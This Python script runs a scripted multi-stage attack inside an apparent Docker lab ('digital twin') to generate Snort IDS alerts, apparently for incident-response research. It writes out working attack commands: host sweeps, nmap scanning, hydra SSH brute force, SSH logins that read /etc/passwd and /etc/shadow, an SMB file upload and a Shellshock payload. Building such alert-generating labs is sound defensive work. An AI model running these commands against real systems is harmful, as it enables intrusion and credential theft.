"""
Execute a multi-stage attack against the digital twin.

Runs from the client container (10.0.1.11) targeting servers on 10.0.2.0/24.
Each stage is designed to trigger Snort IDS alerts on the gateway.
"""
import logging
import time

from llm_ir_dt.docker_manager.docker_manager import DockerManager

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
           "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"


def run(command: str) -> str:
    """
    Execute a command on the client container and log the result.

    :param command: shell command to run
    :return: command output
    """
    result = DockerManager.exec_run(CLIENT, command)
    logger.info("[exit=%s] %s", result["exit_code"], command)
    if result["output"].strip():
        logger.info("Output:\n%s", result["output"].strip())
    return result["output"]


def main() -> None:
    """
    Run a multi-stage attack that leaves traces in the Snort IDS.
    """
    logger.info("=== Stage 1: Reconnaissance (ICMP sweep) ===")
    run("ping -c 3 10.0.2.10")
    run("ping -c 3 10.0.2.11")
    run("ping -c 3 10.0.2.12")
    run("ping -c 3 10.0.2.13")
    run("ping -c 3 10.0.2.14")
    run("ping -c 3 10.0.2.15")

    logger.info("=== Stage 2: Port scanning ===")
    run("nmap -sT -p 22,80,139,445 10.0.2.11 10.0.2.12 "
        "10.0.2.13 10.0.2.14 10.0.2.15")

    logger.info("=== Stage 3: SSH brute-force on server_ssh ===")
    run("hydra -l admin -P /opt/passwords.txt "
        "-t 4 -f ssh://10.0.2.11")

    logger.info("=== Stage 4: SSH login with stolen credentials ===")
    run("sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'whoami; id; hostname; uname -a'")
    time.sleep(1)
    run("sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'cat /etc/passwd'")
    time.sleep(1)
    run("sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'cat /etc/shadow 2>/dev/null || echo "
        "permission denied'")

    logger.info("=== Stage 5: SMB enumeration on server_samba ===")
    run("smbclient -L //10.0.2.12 -N 2>&1 || true")
    run("smbclient //10.0.2.12/share -N "
        "-c 'ls; put /etc/hostname evil_payload.txt; ls' "
        "2>&1 || true")

    logger.info("=== Stage 6: Shellshock exploit on "
                "server_shellshock ===")
    run("curl -s -H 'User-Agent: () { :;}; echo; "
        "echo vulnerable; /usr/bin/id' "
        "http://10.0.2.13/cgi-bin/vulnerable")
    run("curl -s -H 'User-Agent: () { :;}; echo; "
        "cat /etc/passwd' "
        "http://10.0.2.13/cgi-bin/vulnerable")

    logger.info("=== Stage 7: HTTP probing on web servers ===")
    run("curl -s -o /dev/null -w '%{http_code}' "
        "http://10.0.2.14/")
    run("curl -s -o /dev/null -w '%{http_code}' "
        "http://10.0.2.15/")

    """
    88 -    logger.info("=== Stage 8: Lateral movement via SSH ===")
    89 -    run("sshpass -p password123 ssh -o StrictHostKeyChecking=no "
    90 -        "admin@10.0.2.11 'ping -c 2 10.0.2.12'")
    91 -    run("sshpass -p password123 ssh -o StrictHostKeyChecking=no "
    92 -        "admin@10.0.2.11 'curl -s http://10.0.2.13/ "
    93 -        "2>/dev/null || true'")
    """
    logger.info("=== Stage 8: Lateral movement via SSH ===")
    run("sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'echo pivot_host=$(hostname); "
        "echo target=10.0.2.12; ping -c 2 10.0.2.12'")
    run("sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'echo pivot_host=$(hostname); "
        "echo target=10.0.2.13; "
        "curl -s -o /tmp/lateral_shellshock_probe.html "
        "-w \"http_status=%{http_code}\\n\" "
        "http://10.0.2.13/cgi-bin/vulnerable; "
        "head -n 3 /tmp/lateral_shellshock_probe.html'")

    logger.info("=== Attack complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


if __name__ == "__main__":
    main()
